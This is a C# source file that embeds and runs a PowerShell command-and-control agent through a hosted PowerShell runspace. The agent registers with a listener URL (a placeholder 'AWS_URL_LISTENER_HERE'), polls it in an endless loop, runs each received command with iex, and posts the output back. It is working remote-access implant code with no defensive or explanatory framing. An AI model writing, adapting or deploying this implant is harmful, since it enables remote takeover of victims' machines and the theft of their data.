using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;

namespace DotnetVanilla
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            var scriptContents = new StringBuilder();
            scriptContents.AppendLine("$agentid = \"\"");
            scriptContents.AppendLine("while ($true) {");
            scriptContents.AppendLine("    $url = \"AWS_URL_LISTENER_HERE\"");
            scriptContents.AppendLine("    try {");
            scriptContents.AppendLine("        if ($agentid -eq \"\") {");
            scriptContents.AppendLine("            $agentid = (iwr \"$($url)agent-registration\").content");
            scriptContents.AppendLine("        }");
            scriptContents.AppendLine("        else {");
            scriptContents.AppendLine("            $getTask = (Invoke-WebRequest \"$($url)?hostid=$agentid\").content");
            scriptContents.AppendLine("            if ($getTask -eq \"\") { Start-Sleep(1) }");
            scriptContents.AppendLine("            else");
            scriptContents.AppendLine("                       {");
            scriptContents.AppendLine("                $taskID = $getTask.split(\":\")[0]");
            scriptContents.AppendLine("                $command = $getTask -replace \"$($taskID):\",\"\"");
            scriptContents.AppendLine("                $result = try { (iex $command 2>&1 | Out-String )} catch { ($error[0] | Out-String)}");
            scriptContents.AppendLine("                $body = @{ \"hostid\"=\"$agentid\"; \"taskid\"=\"$taskID\"; \"task\"=\"$command\"; \"taskResponse\"=\"$($result.Trim())\"} | ConvertTo-Json");
            scriptContents.AppendLine("                Invoke-WebRequest \"$($url)\" -Method Post -body $body | Out-Null");
            scriptContents.AppendLine("            }");
            scriptContents.AppendLine("        }");
            scriptContents.AppendLine("        Start-Sleep(1)");
            scriptContents.AppendLine("    }");
            scriptContents.AppendLine("    catch {");
            scriptContents.AppendLine("        Start-Sleep(10)");
            scriptContents.AppendLine("    }");
            scriptContents.AppendLine("}");

            RunScript(scriptContents.ToString());
        }

        public static void RunScript(string scriptContents)
        {
            // create a new hosted PowerShell instance using the default runspace.
            // wrap in a using statement to ensure resources are cleaned up.

            using (PowerShell ps = PowerShell.Create())
            {
                // specify the script code to run.
                ps.AddScript(scriptContents);

                // execute the script and await the result.
                var pipelineObjects = ps.Invoke();
            }
        }
    }
}
